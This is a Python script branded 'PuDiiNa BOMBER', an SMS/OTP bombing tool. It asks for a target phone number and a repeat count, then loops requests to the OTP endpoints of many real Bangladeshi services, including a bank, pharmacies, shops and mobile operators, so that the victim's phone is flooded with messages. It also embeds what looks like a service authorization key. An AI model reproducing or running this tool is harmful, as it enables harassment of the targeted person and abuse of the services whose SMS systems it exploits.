

import requests, os, time, sys, smtplib

blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'
os.system('clear')
logo='''
 	    \x1b[1;93m
────────────────
─██████████████─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██████▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████████─
─██▒▒██─────────
─██▒▒██─────────
─██▒▒██─────────
─██████─────────
────────────────
 	    \x1b[91m
────────────────
─██████──██████─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██████▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─
─██████████████─
────────────────
 	    \x1b[1;32m
────────────────
─████████████───
─██▒▒▒▒▒▒▒▒████─
─██▒▒████▒▒▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒████▒▒▒▒██─
─██▒▒▒▒▒▒▒▒████─
─████████████───
────────────────
 	    \x1b[1;93m
────────────
─██████████─
─██▒▒▒▒▒▒██─
─████▒▒████─
───██▒▒██───
───██▒▒██───
───██▒▒██───
───██▒▒██───
───██▒▒██───
─████▒▒████─
─██▒▒▒▒▒▒██─
─██████████─
────────────
 	    \x1b[91m
────────────────────────
─██████──────────██████─
─██▒▒██████████──██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─
─██▒▒██████▒▒██──██▒▒██─
─██▒▒██──██▒▒██──██▒▒██─
─██▒▒██──██▒▒██──██▒▒██─
─██▒▒██──██▒▒██──██▒▒██─
─██▒▒██──██▒▒██████▒▒██─
─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██──██████████▒▒██─
─██████──────────██████─
────────────────────────
 	    \x1b[1;32m
────────────────
─██████████████─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██████▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██████▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██▒▒██──██▒▒██─
─██████──██████─
────────────────
 	    
 	    '''+end
logo_2='''\x1b[93m         --------------------------------------\n\x1b[96m		     **PuDiiNa BOMBER**  \n\x1b[1;32m	          Author  :     PuDiiNa \n\x1b[91m             	  Facebook: 	Md Wahiid \n\x1b[1;32m	          Github  :     pudina2020 \n\x1b[1;93m         --------------------------------------
'''
def logoprint(PuDiNa):
    for word in PuDiNa + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.03)
        
os.system('clear')
print(logo)
logoprint(logo_2)


#option 
print(green+"  [1] Custom Attack")
print(green+"  [2] Robi Web")
print(green+"  [3] Airtel Web")
print(green+"  [4] Connect Admin")


#input option
option = input(cyan+"  [>] Choose a option: ")
inp_option=int(option)
os.system('clear')
logoprint(logo)

#attak from
custom_attack = cyan +'''		     [Custom Attack]
'''
robi_attack = cyan +'''		     [Robi Attack]
'''
airtel_attack = cyan +'''	 	    [Airtel Attack]
'''



#Procssesing
if inp_option==1:
	logoprint(custom_attack)
	number=input(str(yellow+"   Enter Your Target Number: "))
	amo=input(green+"   Enter Amount: ")
	amount=int(amo)
	i=0
	for i in range(amount):
		import requests
		from requests.structures import CaseInsensitiveDict
		#ikra
		
		url = "http://apibeta.iqra-live.com/api/v2/sent-otp/"+number+""
		headers = CaseInsensitiveDict()
		headers["x-user-channel"] = "apps"
		resp = requests.get(url, headers=headers)
		status_ikra = resp.status_code
		
		#cinespot
		
		url = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
		resp = requests.get(url)
		status_cinespot=resp.status_code
		
		#health
		url = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number+""
		resp = requests.get(url)
		
		status_health=resp.status_code
		
		#binge
		url = "https://ss.binge.buzz/otp/send/login"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		data = "phone="+number+""
		resp = requests.post(url, headers=headers, data=data)
		status_binge=resp.status_code
		
		#arogga
		url = "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=99.0.4844.73&os=Android&osv=8.1.0"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		data = "mobile=%2B8801843448308&fcmToken=&referral=VOICEOFDHAKA"
		resp = requests.post(url, headers=headers, data=data)
		status_arogga=resp.status_code
		#shopup
		url = "https://shopup.com.bd/users/send_user_otp.json"

		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"

		data = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
		resp = requests.post(url, headers=headers, data=data)
		status_shopup=resp.status_code
		#swap
		url = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
		headers = CaseInsensitiveDict()
		headers["x-authorization"] = "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
		headers["Content-Type"] = "application/json"
		data = '{"mobile_number":"'+number+'","referral":false}'
		resp = requests.post(url, headers=headers, data=data)
		status_swap=resp.status_code
		
		#nescho
		url = "http://nesco.sslwireless.com/api/v1/login"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		data = "phone_number="+number+""
		resp = requests.post(url, headers=headers, data=data)
		status_necho=resp.status_code
		
		#webacces
		url = "http://27.131.15.19/lstyle/api/lsotprequest"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"
		data = '{"shortcode":"2494905","msisdn":"88'+number+'"}'
		resp = requests.post(url, headers=headers, data=data)
		status_webacces=resp.status_code
		
		#osudpatra
		url = "https://api-2.osudpotro.com/api/v1/users/send_otp"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"
		data = '{"mobile":"+88-'+number+'","deviceToken":"web","language":"en","os":"web"}'
		resp = requests.post(url, headers=headers, data=data)
		status_osudpatra=resp.status_code
		
		#ajkerdeal
		url = "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"
		data = '{"CustomerId": "01833268701","MobileOrEmail":"'+number+'", "Type": 2}'
		resp = requests.post(url, headers=headers, data=data)
		status_ajkerdeal=resp.status_code
		#khaodao
		url = "https://api.eat-z.com/auth/customer/signin"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"
		data = '{"username":"+88'+number+'"}'
		resp = requests.post(url, headers=headers, data=data)
		status_khaodao=resp.status_code
		#shopup
		url = "https://shopup.com.bd/users/send_user_otp.json"

		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"

		data = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
		resp = requests.post(url, headers=headers, data=data)
		status_shopup=resp.status_code
		
		
		
		#unknown
		url = "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no="+number+"&email=mr_aru@gmail.com&verification_type=registration"
		resp = requests.get(url)
		status_un=resp.status_code
		
		#dhakaBank
		url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
		headers = CaseInsensitiveDict()
		headers["Content-Type"] = "application/json"
		data = '{"AccessToken": "", "TrackingNo": "", "mobileNo": "'+number+'", "otpSms": "", "product_id": "201", "requestChannel": "MOB", "trackingStatus": 5}'
		resp = requests.post(url, headers=headers, data=data)
		status_dhb=resp.status_code


		
		
		











		
		
		
		
		
	
		if status_ikra == 200 or status_shopup==200 or status_cinespot==200 or status_binge ==200 or status_arogga==200 or status_swap==200 or status_necho==200 or status_webacces==200 or status_osudpatra==200 or status_ajkerdeal==200 or status_khaodao==200 or status_un==200 or status_dhb==200:
						i+=1
						print(green+f'  [√] {i} sms sent')
		else:
			print(red+'   [×] Sms Not sent')

else: #robi web
		if inp_option==2:
				logoprint(robi_attack)
				number=input(str( yellow+  "   Enter Your Target Number: "))
				amo = input(  green+ "   Enter Amount: ")
				amount=int(amo)
				token=input(str(  cyan+ "   Enter Robi Token: "))
				i=0
				for i in range(amount):
					import requests
					from requests.structures import CaseInsensitiveDict
					url = "https://webapi.robi.com.bd/v1/otp/send_request"
					headers = CaseInsensitiveDict()
					headers["Authorization"] = "Bearer "+token+""
					headers["Content-Type"] = "application/json"
					
					#attack
					
					
					data = '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}'
					resp = requests.post(url, headers=headers, data=data)
						
					data = '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}'
					resp = requests.post(url, headers=headers, data=data)
						
					data = '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"93f73f0d-2974-43e6-9af8-c8325aa8df3d"}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					
						
					data =  '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
					resp = requests.post(url, headers=headers, data=data)
					data =  '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
					resp = requests.post(url, headers=headers, data=data)
					data =  '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data = '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8183aaf0-77be-4a77-b9d8-f48767a4265f"}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b373ffb6-1770-4757-ac63-34da247e3deb"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"dd077167-4c05-4173-b9b0-96ecde75c0c1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"dd077167-4c05-4173-b9b0-96ecde75c0c1"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"dd077167-4c05-4173-b9b0-96ecde75c0c1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"dd077167-4c05-4173-b9b0-96ecde75c0c1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"dd077167-4c05-4173-b9b0-96ecde75c0c1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"dd077167-4c05-4173-b9b0-96ecde75c0c1"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"30c425a5-cd1d-4359-9a9d-6856bafbe6fa"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"30c425a5-cd1d-4359-9a9d-6856bafbe6fa"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"30c425a5-cd1d-4359-9a9d-6856bafbe6fa"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"30c425a5-cd1d-4359-9a9d-6856bafbe6fa"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"30c425a5-cd1d-4359-9a9d-6856bafbe6fa"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"30c425a5-cd1d-4359-9a9d-6856bafbe6fa"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"5c5d9662-b432-4e83-9882-077ae14226c6"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"5c5d9662-b432-4e83-9882-077ae14226c6"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"5c5d9662-b432-4e83-9882-077ae14226c6"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"5c5d9662-b432-4e83-9882-077ae14226c6"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"5c5d9662-b432-4e83-9882-077ae14226c6"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"5c5d9662-b432-4e83-9882-077ae14226c6"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"20b51209-dd23-48e4-b6ad-bb7b1af41021"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"20b51209-dd23-48e4-b6ad-bb7b1af41021"}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"a7726093-7f8c-4fc9-b747-bd4e839f4af1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"a7726093-7f8c-4fc9-b747-bd4e839f4af1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"a7726093-7f8c-4fc9-b747-bd4e839f4af1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"a7726093-7f8c-4fc9-b747-bd4e839f4af1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"a7726093-7f8c-4fc9-b747-bd4e839f4af1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"a7726093-7f8c-4fc9-b747-bd4e839f4af1"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8d14bb6e-899c-415d-8090-af1a16bce1af"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8d14bb6e-899c-415d-8090-af1a16bce1af"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8d14bb6e-899c-415d-8090-af1a16bce1af"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8d14bb6e-899c-415d-8090-af1a16bce1af"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"8d14bb6e-899c-415d-8090-af1a16bce1af"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"8d14bb6e-899c-415d-8090-af1a16bce1af"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b57c2854-8b9d-48d8-abbe-03e0caa28c18"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b57c2854-8b9d-48d8-abbe-03e0caa28c18"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b57c2854-8b9d-48d8-abbe-03e0caa28c18"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b57c2854-8b9d-48d8-abbe-03e0caa28c18"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"b57c2854-8b9d-48d8-abbe-03e0caa28c18"}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"b57c2854-8b9d-48d8-abbe-03e0caa28c18"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"9358cd85-e111-4fe9-8e61-c8fb013348e4"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"9358cd85-e111-4fe9-8e61-c8fb013348e4"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"9358cd85-e111-4fe9-8e61-c8fb013348e4"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"9358cd85-e111-4fe9-8e61-c8fb013348e4"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"en","type":"internet_package","plan_type":"internet_package","uid":"9358cd85-e111-4fe9-8e61-c8fb013348e4"}'
					resp = requests.post(url, headers=headers, data=data)
					data= '{"phone_number":"'+number+'","lang":"bn","type":"internet_package","plan_type":"internet_package","uid":"9358cd85-e111-4fe9-8e61-c8fb013348e4"}'
					resp = requests.post(url, headers=headers, data=data)
					
				if resp.status_code==200:
						i+=1
						print(green+f'  [√] {i} sms sent')
		else:
			print(red+'   [×] Sms Not sent')
							
if inp_option==3:
				logoprint(airtel_attack)
				number  = str(input("[>] Heii Mr : PuDiiNa Sir. apNar aTTack NumBer DiN: "))
				amo = input(  green+ "   Enter Amount: ")
				amount=int(amo)
				token=input(str(  cyan+ "   Enter Airtel Token: "))
				i=0
				for i in range(amount):
					import requests
					from requests.structures import CaseInsensitiveDict
					url = "https://api.bd.airtel.com/v1/send-otp"
					headers = CaseInsensitiveDict()
					headers["Authorization"] = "Bearer "+token+""
					headers["Content-Type"] = "application/json"
					data = '{"phone_number":"'+number+'"}'
					resp = requests.post(url, headers=headers, data=data)
					url="https://api.bd.airtel.com/v1/otp/send_request"
					headers = CaseInsensitiveDict()
					headers["Authorization"] = "Bearer "+token+""
					headers["Content-Type"] = "application/json"
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					
					
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":200,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":400,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":500,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
					data='{"phone_number":"'+number+'","lang":"en","type":"my_plan","plan_type":"my_plan","voice":600,"sms":0,"internet":0,"validity":3}'
					resp = requests.post(url, headers=headers, data=data)
